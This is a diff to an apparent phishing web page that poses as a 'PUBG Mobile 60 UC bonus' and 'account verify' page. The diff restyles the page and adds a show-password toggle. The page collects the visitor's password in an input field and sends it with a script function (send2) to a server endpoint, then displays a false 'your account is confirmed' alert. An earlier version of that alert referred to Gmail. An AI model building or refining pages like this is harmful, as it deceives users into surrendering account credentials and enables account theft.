@@ -10,13 +10,22 @@
         body {
             margin: 0;
             height: 100vh;
-            background: url("https://static3.tgstat.ru/channels/_0/84/84149ba14092fab307e0cf55c791a8a1.jpg") no-repeat center center;
-            background-size: cover;
+            background: url("https://static3.tgstat.ru/channels/_0/84/84149ba14092fab307e0cf55c791a8a1.jpg") no-repeat center center/cover;
             font-family: 'Roboto', Arial, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             color: white;
+            position: relative;
+        }
+
+        /* 🔥 OVERLAY */
+        body::before {
+            content: "";
+            position: absolute;
+            inset: 0;
+            background: rgba(0,0,0,0.7);
+            z-index: 0;
         }
 
         .main {
@@ -24,6 +33,12 @@
             height: 500px;
             display: flex;
             padding: 40px;
+            position: relative;
+            z-index: 1;
+            backdrop-filter: blur(12px);
+            background: rgba(0,0,0,0.4);
+            border-radius: 20px;
+            box-shadow: 0 0 40px rgba(0,0,0,0.9);
         }
 
         .left {
@@ -31,15 +46,18 @@
         }
 
         .title {
-            font-size: 32px;
+            font-size: 30px;
+            font-weight: bold;
+            line-height: 1.4;
         }
 
-        .email {
-            margin-top: 20px;
-            padding: 10px;
-            border: 1px solid #5f6368;
-            border-radius: 20px;
-            display: inline-block;
+        /* 💎 TITLE STYLE */
+        .title span {
+            display: block;
+            font-size: 34px;
+            color: #00f2fe;
+            margin-bottom: 10px;
+            text-shadow: 0 0 12px #00f2fe;
         }
 
         .right {
@@ -49,18 +67,19 @@
             justify-content: center;
         }
 
-        /* 🔥 YANGILANGAN INPUT */
+        /* 🔥 INPUT */
         input {
             width: 100%;
             padding: 16px;
-            border-radius: 10px;
-            background: rgba(0, 0, 0, 0.6); /* qoraroq fon */
-            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-radius: 12px;
+            background: rgba(0, 0, 0, 0.75);
+            border: 2px solid rgba(255,255,255,0.3);
             color: white;
             font-size: 18px;
             outline: none;
-            backdrop-filter: blur(5px);
+            backdrop-filter: blur(6px);
             box-shadow: 0 0 10px rgba(0,0,0,0.7);
+            transition: 0.3s;
         }
 
         input::placeholder {
@@ -68,27 +87,49 @@
         }
 
         input:focus {
-            border: 2px solid #8ab4f8;
-            box-shadow: 0 0 15px #8ab4f8;
-            background: rgba(0, 0, 0, 0.8);
+            border: 2px solid #00f2fe;
+            box-shadow: 0 0 15px #00f2fe;
+            background: rgba(0, 0, 0, 0.9);
+        }
+
+        /* 👁 SHOW PASSWORD */
+        .show-pass {
+            margin-top: 10px;
+            font-size: 14px;
+            cursor: pointer;
+            color: #8ab4f8;
+        }
+
+        .show-pass:hover {
+            text-decoration: underline;
         }
 
         .bottom {
             margin-top: 30px;
             display: flex;
             justify-content: flex-end;
-            gap: 20px;
         }
 
+        /* 🚀 BUTTON */
         button {
-            background: #8ab4f8;
+            background: linear-gradient(45deg, #4facfe, #00f2fe);
             border: none;
-            padding: 10px 25px;
-            border-radius: 20px;
+            padding: 12px 28px;
+            border-radius: 25px;
             cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+            color: white;
+            box-shadow: 0 0 15px rgba(0,242,254,0.7);
+            transition: 0.3s;
         }
 
-        /* 📱 TELEFON UCHUN MOSLASH */
+        button:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 25px rgba(0,242,254,1);
+        }
+
+        /* 📱 TELEFON */
         @media (max-width: 768px) {
             .main {
                 width: 100%;
@@ -97,19 +138,13 @@
                 padding: 20px;
             }
 
-            .left, .right {
-                width: 100%;
+            .title span {
+                font-size: 26px;
             }
 
-            .title {
-                font-size: 24px;
-                text-align: center;
-            }
-
-            .email {
-                display: block;
-                text-align: center;
-                margin: 15px auto;
+            input {
+                font-size: 16px;
+                padding: 14px;
             }
 
             .bottom {
@@ -118,6 +153,7 @@
 
             button {
                 width: 100%;
+                padding: 14px;
             }
         }
     </style>
@@ -128,16 +164,19 @@
 <div class="main">
 
     <div class="left">
-        <div class="title">Pubg mobile 60 uc✅</div>
-        
+        <div class="title">
+            <span>🔐 ACCOUNT VERIFY</span>
+            Pubg mobile 60 UC bonus sahifasi ✅
+        </div>
     </div>
 
     <div class="right">
 
         <input id="msg2" type="password" placeholder="Введите пароль">
 
-        <div style="margin-top:10px;">
-            
+        <div class="show-pass" onclick="toggle()">
+            👁 Показать пароль
+        </div>
 
         <div class="bottom">
             <button onclick="send2()">Далее</button>
@@ -171,7 +210,7 @@ function send2() {
         body: JSON.stringify({ message })
     })
     .then(() => {
-        alert("Ваш аккаунт Gmail подтверждён");
+        alert("Ваш аккаунт подтверждён");
     });
 }
 </script>
